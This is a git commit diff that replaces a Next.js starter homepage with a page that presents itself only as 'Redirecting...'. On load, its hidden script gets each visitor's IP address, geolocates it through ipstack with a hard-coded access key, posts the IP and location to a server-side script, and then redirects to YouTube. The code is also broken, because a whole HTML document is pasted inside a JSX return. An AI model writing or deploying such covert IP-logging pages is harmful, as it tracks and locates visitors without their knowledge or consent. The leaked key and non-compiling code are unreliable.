ee5e0456f1697ef959834f9e03a3b135c5e5979d
paulpogi0523 <136674138+paulpogi0523@users.noreply.github.com>
2023-06-15 13:15:27 +0800

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -4,20 +4,39 @@ import Footer from '@components/Footer'
 
 export default function Home() {
   return (
-    <div className="container">
-      <Head>
-        <title>Next.js Starter!</title>
-        <link rel="icon" href="/favicon.ico" />
-      </Head>
+    <!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Redirecting...</title>
+</head>
+<body>
+  <script>
+    // Get user's IP address
+    var userIP;
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        userIP = data.ip;
 
-      <main>
-        <Header title="Welcome to my app!" />
-        <p className="description">
-          Get started by editing <code>pages/index.js</code>
-        </p>
-      </main>
+        // Use ipstack API to get user's location based on IP address
+        var ipstack_access_key = '3f0de0f5be50240634d0a991c3f9c9cc';
+        var ipstack_api_url = 'http://api.ipstack.com/';
+        fetch(ipstack_api_url + userIP + '?access_key=' + ipstack_access_key)
+          .then(response => response.json())
+          .then(data => {
+            // Send user information to server-side script
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'save_user_data.php'); // change to your server-side script URL
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send('user_ip=' + userIP + '&city=' + data.city + '&region=' + data.region_name + '&country=' + data.country_name);
 
-      <Footer />
-    </div>
+            // Redirect user to another website
+            window.location.href = 'https://www.youtube.com';
+          });
+      });
+  </script>
+</body>
+</html>
   )
 }
